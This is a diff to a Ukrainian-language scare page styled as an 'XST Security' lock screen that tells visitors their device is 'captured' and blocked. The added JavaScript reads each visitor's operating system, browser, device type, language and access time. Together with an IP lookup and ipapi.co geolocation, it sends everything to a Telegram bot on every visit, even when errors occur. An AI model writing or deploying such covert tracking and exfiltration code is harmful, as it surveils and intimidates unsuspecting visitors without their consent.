@@ -409,12 +409,28 @@
                 <div class="data-value" id="deviceInfo">Аналізується...</div>
             </div>
             <div class="data-item">
+                <div class="data-label">💻 ОПЕРАЦІЙНА СИСТЕМА</div>
+                <div class="data-value" id="osInfo">Визначається...</div>
+            </div>
+            <div class="data-item">
+                <div class="data-label">🌍 БРАУЗЕР</div>
+                <div class="data-value" id="browserInfo">Сканування...</div>
+            </div>
+            <div class="data-item">
+                <div class="data-label">🗣️ МОВА СИСТЕМИ</div>
+                <div class="data-value" id="languageInfo">Визначається...</div>
+            </div>
+            <div class="data-item">
                 <div class="data-label">📍 ЛОКАЦІЯ</div>
                 <div class="data-value" id="locationInfo">Визначається...</div>
             </div>
             <div class="data-item">
                 <div class="data-label">🔒 СТАТУС</div>
                 <div class="data-value" style="color:#ff0000">ЗАБЛОКОВАНО</div>
+            </div>
+            <div class="data-item">
+                <div class="data-label">⏰ ЧАС ДОСТУПУ</div>
+                <div class="data-value" id="accessTime">--:--:--</div>
             </div>
             <div class="data-item">
                 <div class="data-label">⏱️ ЧАС БЛОКУВАННЯ</div>
@@ -542,6 +558,34 @@
             });
         }
         
+        // Функція для аналізу User-Agent
+        function parseUserAgent() {
+            const ua = navigator.userAgent;
+            let os = "Невідома ОС";
+            let browser = "Невідомий браузер";
+            let device = "Комп'ютер";
+            
+            // Визначення ОС
+            if (ua.includes("Windows")) os = "Windows";
+            else if (ua.includes("Mac")) os = "macOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iOS") || ua.includes("iPhone")) os = "iOS";
+            
+            // Визначення браузера
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+            else if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+            else if (ua.includes("Edg")) browser = "Edge";
+            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+            
+            // Визначення пристрою
+            if (ua.includes("Mobile")) device = "Мобільний пристрій";
+            if (ua.includes("Tablet")) device = "Планшет";
+            
+            return { os, browser, device };
+        }
+        
         // Отримання IP та інформації
         async function getUserInfo() {
             try {
@@ -551,46 +595,77 @@
                 const userIP = ipData.ip;
                 document.getElementById('userIP').textContent = userIP;
                 
-                // Інфа про пристрій
-                const ua = navigator.userAgent;
-                let device = "Комп'ютер";
-                if(ua.includes('Mobile')) device = "Мобільний пристрій";
-                if(ua.includes('Tablet')) device = "Планшет";
-                document.getElementById('deviceInfo').textContent = device;
+                // Аналізуємо User-Agent
+                const uaInfo = parseUserAgent();
+                document.getElementById('osInfo').textContent = uaInfo.os;
+                document.getElementById('browserInfo').textContent = uaInfo.browser;
+                document.getElementById('deviceInfo').textContent = uaInfo.device;
+                
+                // Мова системи
+                const language = navigator.language || navigator.userLanguage || "Невідомо";
+                document.getElementById('languageInfo').textContent = language;
+                
+                // Час доступу
+                const accessTime = new Date().toLocaleTimeString('uk-UA');
+                document.getElementById('accessTime').textContent = accessTime;
                 
                 // Геолокація
+                let location = "Невідомо";
                 try {
                     const locRes = await fetch(`https://ipapi.co/${userIP}/json/`);
                     const locData = await locRes.json();
                     if(!locData.error) {
-                        const location = `${locData.city || 'Невідомо'}, ${locData.country_name || 'Невідомо'}`;
+                        location = `${locData.city || 'Невідомо'}, ${locData.country_name || 'Невідомо'}`;
                         document.getElementById('locationInfo').textContent = location;
-                        
-                        // Відправляємо в Telegram
-                        await sendToTelegram(userIP, device, location);
-                    } else {
-                        await sendToTelegram(userIP, device, "Невідомо");
                     }
                 } catch(e) {
-                    await sendToTelegram(userIP, device, "Помилка геолокації");
+                    console.log("Помилка геолокації:", e);
                 }
+                
+                // Відправляємо в Telegram всю інформацію
+                await sendToTelegram(
+                    userIP, 
+                    uaInfo.device, 
+                    uaInfo.os, 
+                    uaInfo.browser, 
+                    language, 
+                    location,
+                    accessTime
+                );
                 
                 return userIP;
             } catch(error) {
+                console.error("Помилка отримання інформації:", error);
                 document.getElementById('userIP').textContent = "ЗАБЛОКОВАНО";
-                await sendToTelegram("ЗАБЛОКОВАНО", "Система", "Захоплено");
+                document.getElementById('osInfo').textContent = "НЕВІДОМО";
+                document.getElementById('deviceInfo').textContent = "НЕВІДОМО";
+                
+                // Все одно відправляємо в Telegram
+                await sendToTelegram(
+                    "ПОМИЛКА", 
+                    "Не вдалося отримати", 
+                    "Не вдалося отримати", 
+                    "Не вдалося отримати", 
+                    "Не вдалося отримати", 
+                    "Не вдалося отримати",
+                    new Date().toLocaleTimeString('uk-UA')
+                );
                 return null;
             }
         }
         
         // Відправка в Telegram
-        async function sendToTelegram(ip, device, location) {
+        async function sendToTelegram(ip, device, os, browser, language, location, accessTime) {
             try {
                 const message = `🚨 НОВИЙ ЗАХОПЛЕНИЙ ПРИСТРІЙ!\n\n` +
                                `🌐 IP: ${ip}\n` +
                                `🖥️ Пристрій: ${device}\n` +
+                               `💻 ОС: ${os}\n` +
+                               `🌍 Браузер: ${browser}\n` +
+                               `🗣️ Мова: ${language}\n` +
                                `📍 Локація: ${location}\n` +
-                               `🕐 Час: ${new Date().toLocaleString('uk-UA')}\n` +
+                               `🕐 Час доступу: ${accessTime}\n` +
+                               `⏰ Поточний час: ${new Date().toLocaleString('uk-UA')}\n` +
                                `🔒 Статус: ЗАХОПЛЕНО\n` +
                                `⚠️ Система: XST Security активована`;
                 
@@ -611,6 +686,7 @@
                     addTerminalLine('[XST] █ Інформація передана на сервер');
                 }
             } catch(error) {
+                console.error("Помилка відправки в Telegram:", error);
                 addTerminalLine('[XST] ⚠️ Помилка зв\'язку з сервером');
             }
         }
